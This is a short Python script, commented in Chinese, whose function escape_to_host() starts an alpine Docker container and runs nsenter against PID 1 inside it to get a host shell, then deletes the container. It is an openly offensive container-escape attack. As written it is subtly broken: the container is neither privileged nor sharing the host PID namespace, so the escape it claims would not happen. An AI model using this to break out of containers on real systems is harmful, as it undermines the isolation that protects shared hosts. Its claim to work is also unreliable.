import os

def escape_to_host():
    # 執行 Docker 命令以創建一個新的容器
    os.system('docker run -itd --name escape_container alpine')
    
    # 在容器中執行命令以越獄到主機
    os.system('docker exec -it escape_container nsenter -t 1 -m -u -i -n sh')
    
    # 刪除容器
    os.system('docker rm -f escape_container')